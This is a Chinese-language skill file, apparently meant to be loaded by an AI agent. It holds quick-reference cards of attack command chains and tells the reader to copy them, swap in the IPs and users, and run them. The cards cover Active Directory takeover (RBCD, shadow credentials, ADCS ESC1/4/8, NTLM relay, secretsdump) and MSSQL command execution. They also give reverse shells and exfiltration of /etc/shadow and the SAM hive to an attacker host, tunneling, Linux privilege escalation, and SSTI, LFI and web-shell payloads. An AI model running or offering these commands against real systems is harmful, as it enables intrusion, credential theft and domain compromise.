---
name: 'quickref-cards'
description: '🔴 高频攻击链一键参考卡片 — 每条含前置验证+具体实例+常见错误+成功输出样例。卡壳时第一站。'
whenToUse: '卡壳第一站：搜攻击名直接抄命令链'
metadata: { domain: meta, tier: T1 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

# 攻击链一键参考卡片

> 🔴 **卡壳第一站：CTRL+F 搜攻击名 → 照抄命令 → 改 IP/域/用户 → 执行。**
> 每张卡片 = 前置验证 + 攻击命令(抽象+具体实例) + 成功输出样例 + 常见失败→解决
> 📌 **bloodyAD**: `bloodyAD -H DC_IP -d DOMAIN -u USER -p PASS <category> <cmd> [args]`
> 📌 **impacket**: `impacket-*` 命令直接执行（已入 PATH）

---

## Card 1: RBCD + S4U2Self/Proxy

**触发条件**: GenericWrite/WriteDacl on 目标计算机 + 你控制另一个域账户

### 前置验证
```bash
# 1. 确认对目标有 GenericWrite
bloodyAD -H DC_IP -d dom -u user -p pass get writable
# 成功输出: "CN=COMP01,CN=Computers,DC=dom,DC=local → GenericWrite"

# 2. 确认目标类型（RBCD 只能对计算机账户）
bloodyAD -H DC_IP -d dom -u user -p pass get object "CN=COMP01,CN=Computers,DC=dom,DC=local" --attr objectClass
# 成功输出: objectClass: ['top', 'person', 'organizationalPerson', 'user', 'computer']

# 3. 如果没有受控计算机账户 → 查 MAQ 配额 + 创建
bloodyAD -H DC_IP -d dom -u user -p pass get object 'DC=dom,DC=local' --attr ms-DS-MachineAccountQuota
# ms-DS-MachineAccountQuota > 0 → 可以创建计算机账户
bloodyAD -H DC_IP -d dom -u user -p pass add computer FAKE01 'Password123!'

# 4. 确认受控账户凭据有效
nxc smb DC_IP -u 'controlled_user' -p 'password' -d dom
# 成功输出: [+] dom\controlled_user
```text

### 攻击命令
```bash
# === 抽象 ===
bloodyAD -H DC_IP -d dom -u user -p pass add rbcd <target_DN> <controlled_sAM>
impacket-getST -k -no-pass -dc-ip DC -spn '<svc>/<host>' -impersonate '<victim>' 'dom/controlled'
# 如果用密码认证而非 Kerberos:
impacket-getST 'dom/controlled:Password123!' -dc-ip DC -spn 'cifs/TARGET' -impersonate 'Administrator'
export KRB5CCNAME=victim.ccache

# === 具体实例 ===
bloodyAD -H 10.10.10.10 -d corp.local -u jsmith -p 'Summer2025!' \
  add rbcd "CN=COMP01,CN=Computers,DC=corp,DC=local" "FAKE01$"

impacket-getST -k -no-pass -dc-ip 10.10.10.10 \
  -spn 'cifs/COMP01.corp.local' -impersonate 'Administrator' \
  'corp.local/FAKE01$'

export KRB5CCNAME=Administrator@cifs_COMP01.corp.local.ccache
# 🔴 目标 = DC → 自动 DCSync；目标 = 成员服务器 → dump 本地 SAM
impacket-secretsdump -k -no-pass 'corp.local/Administrator@COMP01.corp.local'
```text

### 验证 RBCD 写入成功
```bash
bloodyAD -H DC_IP -d dom -u user -p pass get object "CN=COMP01,CN=Computers,DC=dom,DC=local" --attr msDS-AllowedToActOnBehalfOfOtherIdentity
# 成功输出: msDS-AllowedToActOnBehalfOfOtherIdentity: <binary blob> → RBCD 已设置 ✅
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | -spn 格式错误或目标不存在 | 确认 FQDN: `nxc smb TARGET_HOST` |
| `KDC_ERR_PREAUTH_FAILED` | 密码/密钥错误 | `impacket-getTGT` 先单独验证凭据 |
| `KRB_AP_ERR_SKEW` | 时钟偏差 | `ntpdate -b DC_IP` |
| `constrained delegation (S4U2Proxy) failed` | ST 不含 TGT | 合并 TGT+ST ccache 或直接传密码 |
| bloodyAD `add rbcd` access denied | 无 Write 权限 | 回到前置验证步骤 1 |

📌 完整版见 rbcd-spnless 卡

---

## Card 2: Shadow Credentials

**触发条件**: GenericWrite on 目标 + KDC 有 CA + DC ≥ Windows Server 2016

### 前置验证
```bash
# 1. 确认 GenericWrite
bloodyAD -H DC_IP -d dom -u user -p pass get writable

# 2. 确认 DC 版本 ≥ 2016（msDS-KeyCredentialLink 的 schema 要求）
bloodyAD -H DC_IP -d dom -u user -p pass get object '' --attr domainControllerFunctionality
# domainControllerFunctionality ≥ 7 (Win2016) ✅

# 3. 确认目标域有 CA (否则 KDC_ERR_PADATA_TYPE_NOSUPP)
certipy find -u 'user@dom' -p 'pass' -dc-ip DC -stdout | grep -i "CA Name"
# 有输出 → CA 存在 ✅
```text

### 攻击命令
```bash
# === 方案A: certipy shadow auto (推荐) ===
certipy shadow auto -u 'jsmith@corp.local' -p 'Summer2025!' \
  -dc-ip 10.10.10.10 -account 'svc_backup'
# 成功输出: [!] Successfully got NT hash for 'svc_backup': <32 hex chars>

impacket-getTGT 'corp.local/svc_backup' -hashes ':NT_HASH' -dc-ip 10.10.10.10
export KRB5CCNAME=svc_backup.ccache

# === 方案B: bloodyAD 手动写 ===
bloodyAD -H DC_IP -d dom -u user -p pass add shadowCredentials 'target_user'

# === 方案C: pywhisker (certipy 失败时) ===
pywhisker.py -d "dom.local" -u "user" -p "pass" --target "target_user" --action "add" --filename "target"
# 然后用 PKINITtools 或 certipy auth 拿 TGT
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | KDC 无 CA | 换 RBCD 路径 (Card 1) |
| `KDC_CLIENT_NOT_TRUSTED` | 证书链问题 | `certipy shadow auto` 加 `-crl 'ldap:///'` |
| `no object SID` | certipy 无法解析 SID | 加 `-username target -domain dom` |

---

## Card 3: BetterSuccessor / dMSA

**触发条件**: KDS Root Key 存在 + CreateChild on OU + GenericWrite on 目标 (Server 2025)

### 前置验证
```bash
# 1. 确认 KDS Root Key 存在
bloodyAD -H DC_IP -d dom -u user -p pass get search --filter '(objectClass=msKdsProvRootKey)'
# 成功输出: CN=<guid>,CN=Group Key Distribution Service,CN=Services,...

# 2. 确认权限
bloodyAD -H DC_IP -d dom -u user -p pass get writable
# 需要: CreateChild on OU + GenericWrite on 目标

# 3. 确认 OS
nxc smb DC_IP -u user -p pass | grep -i "Windows Server 2025"
```text

### 攻击命令
```bash
# === 方案A: SharpSuccessor 一键 (推荐) ===
# 来源: github.com/logangoins/SharpSuccessor (需自行编译)
SharpSuccessor.exe add /impersonate:Administrator \
  /path:"OU=Service Accounts,DC=corp,DC=local" \
  /account:jsmith /password:Summer2025!

# === 方案B: bloodyAD 分步 ===
# 1. 创建 dMSA (子命令名是 badSuccessor，不是 add dMSA！)
bloodyAD -H 10.10.10.10 -d corp.local -u jsmith -p 'Summer2025!' \
  add badSuccessor SVC_MSA \
  --ou "OU=Service Accounts,DC=corp,DC=local" \
  -t "CN=Administrator,CN=Users,DC=corp,DC=local"
# 成功输出: [!] DMSA 'SVC_MSA$' created successfully

# 2. 写 Superseded link (如 add badSuccessor 未自动设置)
# bloodyAD 备选: msldap dmsaaddmanagedaccountprecededbylink
bloodyAD -H 10.10.10.10 -d corp.local -u jsmith -p 'Summer2025!' \
  msldap dmsaaddmanagedaccountprecededbylink SVC_MSA "CN=Administrator,CN=Users,DC=corp,DC=local"

# 或用 LDAP 直连:
python3 -c "
import ldap3
# 🔴 如果 DC 强制 LDAPS，改用: server = ldap3.Server('10.10.10.10', port=636, use_ssl=True)
server = ldap3.Server('10.10.10.10', get_info=ldap3.ALL)
conn = ldap3.Connection(server, 'jsmith@corp.local', 'Summer2025!', authentication=ldap3.NTLM)
conn.bind()
conn.modify('CN=SVC_MSA,OU=Service Accounts,DC=corp,DC=local', {
    'msDS-SupersededManagedAccountLink': [(ldap3.MODIFY_REPLACE, ['CN=Administrator,CN=Users,DC=corp,DC=local'])]
})
print('Modify result:', conn.result)
"

# 3. S4U2Self 获取票据
badS4U2self 'kerberos+pw://corp.local/jsmith:Summer2025!@10.10.10.10/' \
  'krbtgt/corp.local@corp.local' 'SVC_MSA$@corp.local' --dmsa
# 成功输出: Administrator NT hash: xxxxxxxxxxxxxxxx
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| `ERROR_NOT_SUPPORTED` (groupType) | dMSA groupType 问题 | 用 SharpSuccessor 处理 |
| badS4U2self 无输出 / 卡住 | 时钟偏差 | `ntpdate -b DC_IP` |
| bloodyAD `add badSuccessor` failed | 权限不足 / OU 不存在 | 确认 CreateChild on OU；确认 OU 路径正确 |
| ldap3 `unwillingToPerform` | 属性写保护或 LDAPS 要求 | 改用 LDAPS: `port=636, use_ssl=True` |

---

## Card 4: ADCS ESC1 (SAN 冒充)

**触发条件**: certipy find 显示 ESC1 漏洞模板 + 有 Enrollment 权限

### 前置验证
```bash
# 1. 枚举所有 ADCS 漏洞
certipy find -u 'u@d' -p 'p' -dc-ip DC -stdout -enabled -vulnerable
# 成功输出: "[!] Vulnerabilities" 段落 → 含 ESC1

# 2. 获取域 SID（-sid 参数需要，当 UPN 与目标 SID 不匹配时必填）
impacket-lookupsid 'dom/user:pass@DC' | grep "Domain SID"
# 输出: S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX
```text

### 攻击命令
```bash
# === 具体实例 ===
certipy req -u 'jsmith@corp.local' -p 'Summer2025!' \
  -dc-ip 10.10.10.10 -target 'CA01.corp.local' -ca 'corp-CA01-CA' \
  -template 'SubCA-WebServer' -upn 'administrator@corp.local'
# 成功输出: [*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx 'administrator.pfx' -dc-ip 10.10.10.10
# 成功输出: [*] Got hash for 'administrator@corp.local': <NT>:<LM>

# 🔴 如果用 -upn 失败，加上域 SID:
certipy req ... -upn 'administrator@corp.local' -sid S-1-5-21-1234567890-1234567890-1234567890-500
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| `CERTSRV_E_TEMPLATE_DENIED` | 无 Enrollment 权限 | 换其他模板或用 ESC4 改权限 |
| `The NETBIOS connection with the remote host is not available` | -target 不正确 | 确认 CA 服务器 FQDN |
| certipy req 成功但 certipy auth 失败 | UPN-SID 不匹配 | 加 `-sid <DomainSID>-500` |

📌 完整版见 adcs-attack-chain 卡

---

## Card 5: ADCS ESC4 (改模板 ACL → ESC1)

**触发条件**: certipy find 显示 ESC4 (对模板有写权限)

### 攻击命令
```bash
# 1. 备份原配置
certipy template -template 'VULN_TPL' -u 'u@d' -p 'p' -dc-ip DC -save-configuration orig.json
# 成功输出: [*] Saved configuration to 'orig.json'

# 2. 写入危险配置（开启 SAN 指定）
certipy template -template 'VULN_TPL' -u 'u@d' -p 'p' -dc-ip DC -write-default-configuration
# 成功输出: [*] Successfully wrote default configuration to 'VULN_TPL'

# 3. 执行 ESC1 攻击（同 Card 4）
certipy req -u 'u@d' -p 'p' -dc-ip DC -target 'CA.dom' -ca 'CA-NAME' -template 'VULN_TPL' -upn 'admin@dom'
certipy auth -pfx 'admin.pfx' -dc-ip DC

# 4. 🔴 恢复原配置！
certipy template -template 'VULN_TPL' -u 'u@d' -p 'p' -dc-ip DC -write-configuration orig.json
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| certipy template `access denied` | 无模板写权限 | 确认 certipy find 输出含 ESC4 |
| 第3步拿不到证书 | 模板未开启 ENROLLEE_SUPPLIES_SUBJECT | 手动 `set object` 改 mspki-certificate-name-flag |

📌 完整版见 adcs-attack-chain 卡

---

## Card 6: ADCS ESC8 (NTLM Relay → Web Enrollment)

**触发条件**: AD CS Web Enrollment 可用 + 无 EPA 保护 + 能强制 DC 认证

### 前置验证
```bash
# 确认 Web Enrollment 端点
curl -k https://CA_SERVER/certsrv/ | grep -i "Active Directory Certificate Services"
# 有输出 → 端点存在 ✅

# 🔴 攻击机端口检查 — 445 必须空闲！
ss -tlnp | grep 445
# 有输出 → 已有进程占用 → 先 kill 或换方案
```text

### 攻击命令
```bash
# 终端1: 启动 relay
certipy relay -target 'http://CA.corp.local' -ca 'corp-CA01-CA' \
  -template 'DomainController' -interface 0.0.0.0
# 成功输出: [*] Listening on 0.0.0.0:445

# 终端2: 强制 DC 认证
python3 PetitPotam.py -d corp.local -u 'jsmith' -p 'Summer2025!' \
  '192.168.45.100' 'DC01.corp.local'
# 192.168.45.100 = 攻击机 IP

# 备选 coercion 方法 (PetitPotam 失败时):
# coercer coerce -u u -p p -d dom --target DC --listen-ip ATK_IP
# python3 dfscoerce.py -u u -p p -d dom ATK_IP DC_IP
# python3 ShadowCoerce.py -u u -p p -d dom ATK_IP DC_IP

# 终端1 收到 DC$ 证书:
# [*] Got certificate for 'DC01$' → 自动保存为 dc01.pfx
certipy auth -pfx 'dc01.pfx' -dc-ip 10.10.10.10 -username 'DC01$' -domain 'corp.local'
# 成功输出: [*] Got hash for 'DC01$': <NT>:<LM>
impacket-secretsdump -k -no-pass 'corp.local/DC01$@DC01.corp.local'
```text

📌 完整版见 adcs-attack-chain 卡

---

## Card 7: MSSQL 攻击链

**触发条件**: MSSQL 端口 1433 开放 + 有效凭据

### 前置验证
```bash
nxc mssql TARGET -u 'sa' -p ''                    # 空 sa 密码
nxc mssql TARGET -u 'sa' -p 'P@ssw0rd'           # 弱密码
nxc mssql TARGET -u 'user' -p 'pass' -d dom       # 域用户
nxc mssql TARGET -u 'user' -p 'pass' -d dom -M mssql_priv  # 查权限

# 确认是 sysadmin
nxc mssql TARGET -u u -p p -q "SELECT is_srvrolemember('sysadmin')"
# 输出 1 → sysadmin ✅
```text

### 攻击命令
```bash
# === 路径A: xp_cmdshell (需要 sysadmin) ===
# 🔴 务必用 FQDN 连接！用 IP 会因 SPN 不匹配导致 Login failed
impacket-mssqlclient 'dom/user:pass@SRV01.dom.htb' -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -enc <BASE64_REVERSE_SHELL>

# === 路径B: UNC injection (任何认证用户 → 捕获 NetNTLMv2) ===
# 攻击机
sudo impacket-smbserver -smb2support SHARE /tmp &
# MSSQL 端
SQL> EXEC xp_dirtree '\\192.168.45.100\share\test',1,1
# → NetNTLMv2 hash 出现在 smbserver 输出
# → 爆破: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
# → 或 relay: ntlmrelayx.py -t <target> (见 Card 8)

# === 路径C: Linked Servers ===
SQL> SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
SQL> EXEC ('SELECT @@version') AT [LINKED_SRV];
SQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV];

# === 路径D: IMPERSONATE (模拟高权限登录) ===
SQL> SELECT DISTINCT name FROM sys.server_principals WHERE type IN ('S','U','G') AND name NOT LIKE '##%';
SQL> EXECUTE AS LOGIN = 'sa';
SQL> SELECT SYSTEM_USER;  # 应该输出 'sa'

# === 路径E: OLE Automation (xp_cmdshell 被删/禁时) ===
SQL> EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
SQL> DECLARE @shell INT; EXEC sp_oacreate 'WScript.Shell', @shell OUTPUT;
SQL> EXEC sp_oamethod @shell, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\out.txt';
SQL> EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';  # 或用 BULK INSERT 读文件
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| `Login failed` with -windows-auth + IP | SPN 不匹配 | 🔴 **必须用 FQDN** 连接 |
| `xp_cmdshell` blocked / not found | 被禁用或删除 | 尝试 OLE Automation (路径E) |
| 命令执行无回显 (只有 NULL) | xp_cmdshell 输出限制 | `INSERT INTO #tmp EXEC xp_cmdshell 'cmd'; SELECT * FROM #tmp` |
| `EXECUTE AS LOGIN` 失败 | 无 IMPERSONATE 权限 | 先查: `SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'` |

📌 完整版见 mssql-attack-chain 卡

---

## Card 8: NTLM Relay → RBCD

**触发条件**: 内网中有无 SMB signing 的主机 + 可强制认证

### 前置验证
```bash
# 找无 SMB signing 的目标
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt

# 确认 LDAP signing 状态
nxc ldap DC_IP
# signing: False → 可 relay ✅
```text

### 攻击命令
```bash
# 1. 配置 Responder (关闭 SMB/HTTP — 只毒化不捕获)
sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I tun0 -v &

# 2. 启动 relay
# --remove-mic: 绕过 MIC 保护 (CVE-2019-1040)
# --remove-sign-seal: 绕过签名/加密 (CVE-2025-33073, 新版 ntlmrelayx)
ntlmrelayx.py -t ldaps://DC --delegate-access -smb2support --remove-mic
# 🔴 如果 LDAPS relay 失败 (channel binding) → 试 LDAP:
# ntlmrelayx.py -t ldap://DC --delegate-access -smb2support --remove-mic

# 3. 强制认证
python3 PetitPotam.py ATK_IP DC_IP
# 备选: coercer coerce -u u -p p -d dom --target DC --listen-ip ATK_IP

# 4. relay 输出会显示创建的计算机账户名和密码
# 成功输出: [*] Adding computer account: COMPUTERNAME$  Password: xxxxxxxx
impacket-getST -spn 'cifs/DC' -impersonate 'Administrator' -dc-ip DC \
  'dom/NEWCOMP$:Password123!'
export KRB5CCNAME=Administrator@cifs_DC.ccache
impacket-secretsdump -k -no-pass DC
```text

---

## Card 9: gMSA 密码提取 + AES256 派生

**触发条件**: 你控制的账户能读 gMSA 的 msDS-ManagedPassword

### 攻击命令
```bash
# 1. 提取 gMSA 密码 blob
bloodyAD -H DC_IP -d dom -u user -p pass \
  get object 'CN=gMSA_SVC,CN=Managed Service Accounts,DC=dom,DC=htb' \
  --attr msDS-ManagedPassword
# 成功输出: msDS-ManagedPassword: <base64 blob>

# 2. 从 blob 计算 NT hash
gMSADumper.py -u 'user@dom' -p 'pass' -d dom -l DC_IP
# 成功输出: gMSA_SVC:::xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

# 备选: 如果 gMSADumper.py 失败 → 手动解码
# blob 结构: 前4字节=版本, 接下来是 GroupKey 数据

# 3. 🔴 如需 AES256 key (Kerberos-only / RC4 禁用):
# RFC 3961 派生 — salt 格式: DOMAINhostusername.domain (注意大小写!)
aesKrbKeyGen.py -domain DOM.HTB -user 'gMSA_SVC' -pass <hex_blob> -host

# 4. 用 NT hash 获取 TGT
impacket-getTGT 'dom/gMSA_SVC$' -hashes ':NT_HASH' -dc-ip DC
# 或用 AES256:
impacket-getTGT 'dom/gMSA_SVC$' -aesKey <AES256_HEX> -dc-ip DC
export KRB5CCNAME=gMSA_SVC\$.ccache
```text

### 常见失败
| 错误 | 原因 | 解决 |
|------|------|------|
| PBKDF2 直接输出当 AES key | AES key 需 RFC 3961 派生 | 用 aesKrbKeyGen.py，确认 salt 格式 |
| `KDC_ERR_PREAUTH_FAILED` (AES) | salt 不对 | salt = `DOMAINhostusername.domain` (大写域 + 小写 host) |
| `gMSADumper.py` 无输出 | 权限不足或 gMSA 不存在 | 先验证: `get object ... --attr sAMAccountName` |

---

## Card 10: Kerberos-Only 环境速查

**触发条件**: NTLM 全部失败但 Kerberos 成功 → No-NTLM / RC4 禁用环境

### 识别信号
```bash
# 信号1: NTLM 全失败
nxc smb DC -u u -p p               # STATUS_LOGON_FAILURE
evil-winrm -i DC -u u -p p         # access denied

# 信号2: Kerberos 成功
impacket-getTGT dom/user:'pass' -dc-ip DC  # ✅ TGT acquired
# 成功输出: [*] Saved credential cache to 'user.ccache'
```text

### 强制 Kerberos 工具链
```bash
# 获取 TGT
impacket-getTGT 'dom/user:password' -dc-ip DC
export KRB5CCNAME=user.ccache

# 验证 TGT 有效
klist
# 成功输出: Valid starting ... Expires ... Service principal: krbtgt/DOM...

# 所有后续操作用 -k -no-pass
impacket-psexec -k -no-pass 'dom/user@DC'
impacket-secretsdump -k -no-pass 'dom/user@DC'
nxc smb DC -k --use-kcache

# 🔴 AES256-only 环境 (RC4 全禁用 → $krb5$23$ 等不工作)
impacket-getTGT dom/user -aesKey <AES256_HEX> -dc-ip DC
# AES256 获取方法: 见 Card 9 - gMSA 密码提取
```text

---

## Card 11: Reverse Shell 一行链

**触发条件**: 拿到 RCE → 需要交互 shell

### Linux 受害机
```bash
# === Bash (最可靠) ===
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# === nc (传统版 -e 支持) ===
nc -e /bin/bash 10.10.14.5 4444

# === nc (OpenBSD 版 -e 不支持) ===
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# === Python ===
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.5",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'

# === socat ===
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444

# === PHP ===
php -r '$s=fsockopen("10.10.14.5",4444); proc_open("/bin/bash -i", array(0=>$s,1=>$s,2=>$s), $p);'
```text

### Windows 受害机
```powershell
# === PowerShell (Base64 编码 — 绕过特殊字符问题) ===
# 1. 生成 payload (攻击机):
pwsh -c "$t='10.10.14.5';$p=4444; $c=New-Object System.Net.Sockets.TCPClient($t,$p); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i); $r=iex $d 2>&1|Out-String; $sb=[Text.Encoding]::ASCII.GetBytes($r); $s.Write($sb,0,$sb.Length);$s.Flush()}; $c.Close()"
# 2. Base64 编码上面的 payload
# 3. 目标执行: powershell -enc <BASE64>

# === nc.exe (上传后) ===
nc.exe 10.10.14.5 4444 -e cmd.exe
```text

### 攻击机监听
```bash
# nc (最简单)
nc -lvnp 4444

# 🔴 强烈推荐: socat PTY (支持 tab/ctrl-c/箭头)
socat file:$(tty),raw,echo=0 tcp-listen:4444

# rlwrap (给 nc 加 readline)
rlwrap nc -lvnp 4444

# 拿到 shell 后立即升级:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z 暂停 → stty raw -echo; fg → export TERM=xterm
```text

---

## Card 12: 文件传输速查

**触发条件**: 需要在攻击机和受害机之间传文件

### 攻击机 → 受害机 (上传)
```bash
# === Python HTTP (最通用) ===
# 攻击机: python3 -m http.server 8080
# 受害机 Linux: wget http://10.10.14.5:8080/tool -O /tmp/tool
# 受害机 Linux: curl http://10.10.14.5:8080/tool -o /tmp/tool
# 受害机 Windows: certutil -urlcache -split -f http://10.10.14.5:8080/tool C:\Windows\Temp\tool.exe
# 受害机 Windows: iwr -Uri http://10.10.14.5:8080/tool -OutFile C:\Windows\Temp\tool.exe

# === SMB (内网 Windows→Windows, 无需 HTTP) ===
# 攻击机: sudo impacket-smbserver -smb2support SHARE /path/to/files
# 受害机: copy \\10.10.14.5\SHARE\tool.exe C:\Windows\Temp\

# === Base64 (绕过防火墙, 适合小文件) ===
# 攻击机: base64 -w0 tool | xclip -sel c  (xclip 需 apt install xclip)
# 受害机: echo '<base64>' | base64 -d > /tmp/tool
# Windows: certutil -decode b64.txt tool.exe
```text

### 受害机 → 攻击机 (下载/窃取)
```bash
# === nc (最简单, 适合单文件) ===
# 攻击机: nc -lvnp 4444 > file.txt
# 受害机: nc 10.10.14.5 4444 < /etc/passwd

# === curl POST ===
# 攻击机: nc -lvnp 8080 > shadow.txt   (不用 python http.server — 它不处理 POST)
# 受害机: curl -X POST -d @/etc/shadow http://10.10.14.5:8080/

# === SMB (Windows → 攻击机) ===
# 攻击机: sudo impacket-smbserver -smb2support SHARE /tmp
# 受害机: reg save HKLM\SAM C:\Windows\Temp\SAM && copy C:\Windows\Temp\SAM \\10.10.14.5\SHARE\SAM

# === Base64 (小文件, 无网络传输) ===
# 受害机: base64 -w0 /etc/shadow → 复制输出
# 攻击机: echo '<paste>' | base64 -d > shadow
```text

### 特殊场景
```bash
# PowerShell 无 certutil → .NET WebClient
# (New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8080/tool.exe', 'C:\Windows\Temp\tool.exe')

# 无 wget/curl → /dev/tcp (纯 bash)
# exec 3<>/dev/tcp/10.10.14.5/8080; echo -e "GET /tool HTTP/1.0\r\n" >&3; cat <&3 > /tmp/tool

# SCP (有 SSH 凭据时):
scp user@10.10.14.5:/path/file /tmp/
```text

---

## Card 13: Tunneling 速启

**触发条件**: 需要访问受害机内网 → 建 SOCKS 隧道

### Chisel (首选 — 单二进制, 反向 SOCKS)
```bash
# === 攻击机 (server) ===
./chisel server -p 8000 --reverse
# 成功输出: server: Fingerprint...  Listening on http://0.0.0.0:8000

# === 受害机 (client) ===
./chisel client 10.10.14.5:8000 R:socks
# 成功输出: client: Connected (Latency ...)
# → 攻击机 127.0.0.1:1080 即 SOCKS5 代理

# 验证隧道存活
ss -tlnp | grep 1080          # 端口监听
ps aux | grep chisel | grep -v grep  # 进程存活

# proxychains 配置 (/etc/proxychains4.conf):
# [ProxyList]
# socks5 127.0.0.1 1080

# 使用: proxychains4 nxc smb 172.16.1.0/24
```text

### Ligolo-ng (备选 — 双层代理, 更稳定)
```bash
# === 攻击机 (proxy) ===
sudo ip tuntap add user $(logname) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.1.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
# 成功输出: INFO[0000] Listening on 0.0.0.0:11601

# === 受害机 (agent) ===
./agent -connect 10.10.14.5:11601 -ignore-cert
# 成功输出: INFO[0000] Connection established

# === proxy 终端操作 ===
ligolo-ng » session                # 选 session
ligolo-ng » start                  # 启动隧道
# → 172.16.1.0/24 现在直接从攻击机可达 (无需 proxychains!)
```text

### SSH 动态转发 (有 SSH 凭据时)
```bash
# 攻击机:
ssh -D 1080 -N -f user@VICTIM_IP
# → 127.0.0.1:1080 SOCKS 代理
```text

---

## Card 14: Linux 提权速查

**触发条件**: 拿到 www-data / 低权限 shell → 需要 root

### 第一步：秒杀路径（按顺序跑）
```bash
# 0. 🔴 2026 通杀内核
uname -r
# Linux 5.10-6.13 → Copy Fail (CVE-2026-31431)
# Linux 6.1-6.13 → Dirty Frag (CVE-2026-43284)
# 验证可用: unshare -U true 2>&1  # 无 "Operation not permitted" → 可用

# 1. sudo -l (最优先!)
sudo -l
# (root) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/bash'
# (root) NOPASSWD: /usr/bin/python3 /opt/script.py → 可控输入?

# 2. SUID
find / -perm -4000 -type f 2>/dev/null | grep -v snap
# /usr/bin/bash → bash -p
# /usr/bin/python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 3. capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3.10 cap_setuid+ep → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 4. cron
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
# 可写脚本? → echo 'bash -i >& /dev/tcp/...' >>
# 通配符注入? → tar 用 --checkpoint=1 --checkpoint-action=exec=

# 5. 环境变量
env; cat /proc/1/environ | tr '\0' '\n' | grep -iE 'pass|secret|key|token|cred'

# 6. 内网服务
ss -ntlp | grep 127.0.0.1
# 每个端口 → curl / nc 探测 → 本机服务可能以 root 运行

# 7. 可写 /etc/passwd
ls -la /etc/passwd /etc/shadow
# 可写 passwd → openssl passwd -1 'password' 生成 hash → echo 'toor:$1$...:0:0::/root:/bin/bash' >> /etc/passwd; su toor
```text

### 专用提权 CVE 对照
```bash
sudo -V | head -1  # sudo 版本 → searchsploit
# sudo < 1.9.5p2 → CVE-2021-3156 (Baron Samedit)
# sudo < 1.8.28 → CVE-2019-14287 (-u#-1 bypass)
# sudoedit 1.8-1.9 → CVE-2023-22809

pkexec --version    # polkit 版本
# < 0.120 → CVE-2021-4034 (PwnKit)

dpkg -l | grep -iE 'snapd|docker|lxc'
# snapd < 2.73 → CVE-2021-44731 (snap-confine)
```text

---

## Card 15: Web 漏洞速查

**触发条件**: 发现 Web 应用 → 测试输入点

### SSTI (模板注入)
```python
# 检测: {{7*7}} → 输出 49? → SSTI
# ${7*7} → 输出 49? → SSTI (FreeMarker)

# Jinja2 (Python/Flask):
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}

# Twig (PHP):
{{ ['id'] | map('system') | join }}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

# FreeMarker (Java):
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```text

### SQLi (快速检测 → 利用)
```bash
# 检测: ' → 报错 → SQLi 可能
# ' OR '1'='1 → 绕过登录
# ' UNION SELECT 1,2,3,... -- → 联合查询
# sqlmap 一键: sqlmap -u "URL" --data 'user=admin&pass=test' --dbs --batch

# MSSQL 特殊:
' UNION SELECT 1,@@version,3--  # 版本
' UNION SELECT 1,db_name(),3--   # 数据库名
'; EXEC xp_cmdshell 'whoami'--   # RCE (需 sysadmin)
```text

### LFI → RCE
```bash
# 检测: ../../../etc/passwd → 输出 → LFI

# /proc 利用:
/proc/self/environ   # User-Agent 注入 PHP 代码 → LFI
/proc/self/fd/9      # 临时文件包含

# PHP filter chain (无文件上传时):
php://filter/convert.base64-encode/resource=index  # 读源码
# PHP filter chain → RCE: https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'

# 日志投毒:
# 1. User-Agent: <?php system($_GET['c']);?>
# 2. LFI: /var/log/apache2/access.log?c=id

# pearcmd (Laravel/PHP, register_argc_argv=On):
# /index.php?+config-create+/&locale=../../../public/shell.php&+<?=system($_GET['c'])?>+
```text

### 文件上传 Bypass
```bash
# 扩展名: .php → .php5 .phtml .phar .shtml .pht .php.
# .jsp → .jspx .JSP .Jsp
# .php.jpg → .php (截断: %00, .php%00.jpg)
